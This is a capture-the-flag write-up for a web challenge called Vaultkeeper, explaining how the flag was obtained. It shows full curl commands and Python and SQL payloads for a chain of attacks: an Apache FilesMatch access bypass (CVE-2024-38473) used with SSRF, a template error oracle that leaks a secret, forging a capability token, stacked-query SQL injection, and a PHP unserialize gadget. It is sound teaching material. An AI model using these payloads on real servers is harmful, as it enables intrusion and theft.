# Vaultkeeper

Self-hosted backup/restore appliance (web, 500 pts). The flag lives at `/flag.txt`,
outside the web root, behind a chain of loopback-only endpoints. Key idea: the
CVE-2024-38473 Apache `<FilesMatch>` bypass (an encoded `?` in the path) turns the
app's own SSRF sink into a loopback request, which unlocks the whole internal API.

## Recon

Given file: `vaultkeeper-source.zip`. The deployed image is Apache 2.4.56 +
PHP 8.2 via `mod_proxy_fcgi` + MariaDB.

```bash
$ unzip -l vaultkeeper-source.zip | head
  apache/vaultkeeper.conf
  src/public/api/keyring.php
  src/public/api/vault_unseal.php
  src/public/api/fetch_source.php
  src/public/api/request_restore.php
  src/public/api/render_template.php
  src/public/restore.php
  src/lib/recovery.php
  src/lib/spool.php
  ...
```

The Apache vhost is the core of the puzzle:

```apache
$ cat apache/vaultkeeper.conf
<FilesMatch "\.php$">
    SetHandler "proxy:fcgi://127.0.0.1:9000"
</FilesMatch>
<FilesMatch "^(fetch_source|peer_probe|webhook_test)\.php$">
    Require ip 127.0.0.1
</FilesMatch>
<FilesMatch "^(keyring|vault_unseal)\.php$">
    Require ip 127.0.0.1
</FilesMatch>
```

Five PHP files are gated behind `Require ip 127.0.0.1`:

- `api/fetch_source.php` — the only outbound-HTTP sink (`file_get_contents($url)`
  with `follow_location`, no host filter). Also gated.
- `api/keyring.php` — lists restore sessions (`id`, `session_id`) and advertises
  `unseal_ref`.
- `api/vault_unseal.php` — releases `cap_key_masked = base64(cap_key XOR cap_mask)`
  to a peer that presents `unseal_ref`.
- `api/peer_probe.php`, `api/webhook_test.php`.

## Analysis

Observation: `fetch_source.php` fetches any `http(s)` URL and returns the body
(unfiltered host), but it and its targets are all gated by `Require ip 127.0.0.1`,
and the platform only exposes port 80 (Apache sees the forwarder's non-loopback IP).
So the entry point is an SSRF hidden behind an Apache access-control rule.

Hypothesis: bypass the `<FilesMatch>` gate. Confirmation: **CVE-2024-38473** — an
encoded `?` (`%3F`) in the path makes Apache's `r->filename` differ from the
basename the `<FilesMatch>` regex sees, while the `SetHandler \.php$` still fires
and PHP-FPM executes the real file. The loopback check inside the PHP file then
sees `REMOTE_ADDR=127.0.0.1` (the app fetching itself) and passes.

```bash
$ curl 'http://HOST/api/fetch_source.php%3Fooo.php?url=http://127.0.0.1/api/keyring.php'
{"service":"vk-keyring","restore_sessions":[...],"unseal_ref":"...","seal_service":"/api/vault_unseal.php"}
```

That one gate bypass unlocks the full chain:

1. `keyring.php` -> restore `session_id` + `unseal_ref`.
2. `vault_unseal.php?ref=<unseal_ref>` -> `cap_key_masked`.
3. Leak `cap.mask` byte-by-byte through a `render_template.php` error oracle.
4. `cap_key = cap_key_masked XOR cap_mask`.
5. Forge a `maintainer` capability (AES-128-GCM under `cap_key`).
6. `restore.php?job=<sid>` `import_db` -> backtick breakout in
   `vk_import_database()`'s `DROP TABLE IF EXISTS \`vk_restore\`.\`$name\`` ->
   stacked UPDATE promotes the job to `operator`.
7. `system_restore` with a `state.dat` "VKR2" checkpoint envelope -> PHP
   `unserialize` gadget -> `copy('/flag.txt', '/var/www/html/public/flag.txt')`.
8. `GET /flag.txt`.

## Exploit

1. **Create a restore session.** `request_restore.php` inserts a `restore` job and
   returns `job_id` plus a guest capability (but not the `session_id`).

```bash
$ curl -s -X POST http://HOST/api/request_restore.php -d 'source_label=x'
{"ok":true,"job_id":1,"note_ts":"dispatched","status":"awaiting-bundle","cap":"<guest-cap>","note":"..."}
```

2. **Bypass the loopback gate and read the keyring.** Reach `keyring.php` through
   `fetch_source.php` with the CVE-2024-38473 encoded `?`, using the loopback URL
   as the `url` parameter.

```bash
$ curl -s 'http://HOST/api/fetch_source.php%3Fooo.php?url=http://127.0.0.1/api/keyring.php'
{"service":"vk-keyring","node":"node-a","restore_sessions":[{"id":1,"session_id":"<24-hex-session-id>"}],
 "unseal_ref":"<24-hex-unseal-ref>","seal_service":"/api/vault_unseal.php","issued":"..."}
```

This gives the full `session_id` of our own job (matched by `job_id`) and the
`unseal_ref` needed for the next step.

3. **Unseal the masked capability key.** Present `unseal_ref` to the seal service.

```bash
$ curl -s 'http://HOST/api/fetch_source.php%3Fooo.php?url=http://127.0.0.1/api/vault_unseal.php?ref=<unseal-ref>'
{"cap_key_masked":"<base64>","alg":"aes-128-gcm","slot":"operator","node":"node-a","issued":"..."}
```

`cap_key_masked = base64(cap_key XOR cap_mask)` (16 bytes each).

4. **Leak `cap.mask` with the render-template error oracle.** With
   `event=maintenance.*`, `render_template.php` puts the mask into
   `config.cap_mask` and treats it as a protected secret. The pipeline
   `[[ config.cap_mask | at:i | code | sub:K | bar:x ]]` renders `[redacted]`
   iff `ord(mask[i]) >= K`; when `ord(mask[i]) < K`, `str_repeat('x', <0>)`
   throws and the raw span is echoed instead. Binary-search each byte in `[48,123]`.

```bash
$ curl -s -X POST http://HOST/api/render_template.php \
  --data-urlencode 'template=[[ config.cap_mask | at:0 | code | sub:90 | bar:x ]]' \
  --data-urlencode 'event=maintenance.x'
{"event":"maintenance.x","ok":true,"rendered":"[redacted]","tokens":[...]}   # ord(mask[0]) >= 90
```

The script `leak_mask.py` automates this. One leaked mask (saved to `mask.json`):

```text
ljASkEoMaJV9NaYz
```

5. **Recover the capability key** by XOR-ing the masked key with the mask.

```python
import base64
cap_key = bytes(a ^ b for a, b in zip(base64.b64decode(cap_key_masked), mask.encode()))
```

6. **Forge a `maintainer` capability.** `vk_cap_issue` is AES-128-GCM over
   `scope` padded to 16 bytes; we reproduce it with the recovered key.

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os, base64
rec = b"maintainer".ljust(16, b" ")
iv  = os.urandom(12)
cap = base64.b64encode(iv + AESGCM(cap_key).encrypt(iv, rec, None)).decode()
```

7. **SQLi via `import_db`.** Upload a `.vkb` bundle whose `database.sql` creates a
   table whose *name* breaks out of the backtick in `vk_import_database()`'s
   cleanup query. The `vk_app` PDO connection has `MYSQL_ATTR_MULTI_STATEMENTS` on,
   so the stacked `UPDATE` runs against `vaultkeeper.jobs`.

```sql
CREATE TABLE `x`; UPDATE vaultkeeper.jobs SET role='operator' WHERE id=<job-id>; -- ` (id INT);
```

The engine then emits:

```sql
DROP TABLE IF EXISTS `vk_restore`.`x`; UPDATE vaultkeeper.jobs SET role='operator' WHERE id=<job-id>; -- `
```

Post the bundle and run the import with the forged maintainer cap:

```bash
$ curl -s -X POST "http://HOST/restore.php?job=<session-id>" \
  -F action=import_db -F cap=<forged-maintainer-cap> -F bundle=@evil.vkb
```

The job's `role` is now `operator`.

8. **RCE via the checkpoint resume gadget.** `restore.php`'s `system_restore`
   action requires `role=operator` and calls `vk_resume_checkpoint()` on a
   `state.dat` entry: a `"VKR2" | HMAC-SHA256(payload, vk_ckpt_key()) | payload`
   envelope that is then `unserialize`d. The gadget chain
   `SnapshotRef -> DocFragment -> PartialLoader -> ManifestCursor` reaches
   `call_user_func_array('copy', ['/flag.txt','/var/www/html/public/flag.txt'])`
   on `__destruct`/`__toString`.

```python
import hmac, hashlib
spec   = '{"stage":"copy","args":["/flag.txt","/var/www/html/public/flag.txt"]}'
def php_str(s):
    b = s.encode()
    return 's:%d:"%s";' % (len(b), s)
frag   = php_str(spec)
cursor = 'O:14:"ManifestCursor":2:{s:9:"fragments";a:1:{i:0;' + frag + '}s:17:"\0ManifestCursor\0i";i:0;}'
loader = 'O:13:"PartialLoader":0:{}'
doc    = 'O:11:"DocFragment":2:{s:6:"loader";' + loader + 's:6:"cursor";' + cursor + '}'
store  = 'O:13:"SnapshotStore":1:{s:7:"written";i:0;}'
ref    = 'O:11:"SnapshotRef":2:{s:5:"store";' + store + 's:3:"ref";' + doc + '}'
ckpt   = hmac.new(cap_key, b'vk-resume-envelope.v2', hashlib.sha256).digest()
mac    = hmac.new(ckpt, ref.encode(), hashlib.sha256).digest()
state  = b'VKR2' + mac + ref.encode()
```

Bundle `state.dat` into a `.vkb` and run the restore:

```bash
$ curl -s -X POST "http://HOST/restore.php?job=<session-id>" \
  -F action=system_restore -F bundle=@rce.vkb
```

9. **Read the flag.**

```bash
$ curl -s http://HOST/flag.txt
TFC{04d4c11ea3641f2ec562b657ea6428b4}
```

## Full chain

1. `curl -s -X POST http://HOST/api/request_restore.php -d 'source_label=x'`
2. `curl -s 'http://HOST/api/fetch_source.php%3Fooo.php?url=http://127.0.0.1/api/keyring.php'`
3. `curl -s 'http://HOST/api/fetch_source.php%3Fooo.php?url=http://127.0.0.1/api/vault_unseal.php?ref=<unseal-ref>'`
4. leak `cap.mask` via `render_template.php` (`[[ config.cap_mask | at:i | code | sub:K | bar:x ]]`), binary search K
5. `cap_key = cap_key_masked XOR cap_mask`
6. forge `maintainer` cap (AES-128-GCM under `cap_key`)
7. `POST /restore.php?job=<sid>` `action=import_db` with backtick-breakout `database.sql` -> role `operator`
8. `POST /restore.php?job=<sid>` `action=system_restore` with VKR2 `state.dat` gadget -> `copy('/flag.txt', web root)`
9. `curl -s http://HOST/flag.txt`

## Flag

`TFC{04d4c11ea3641f2ec562b657ea6428b4}`

## Lessons

- Apache `<FilesMatch>` matches `r->filename`, not the URL path; `%3F` splits the
  two and defeats a `Require ip` gate (CVE-2024-38473).
- A loopback-gated SSRF chain is still an SSRF chain: one gate bypass unlocks the
  whole internal API (`keyring -> vault_unseal -> cap`).
- `unserialize` only ever fires magic methods when `allowed_classes` is not set to
  `false`; a `"magic"|HMAC|payload` envelope means you must first recover the HMAC
  key (here by XOR-ing two leaks) before you can ride the gadget.
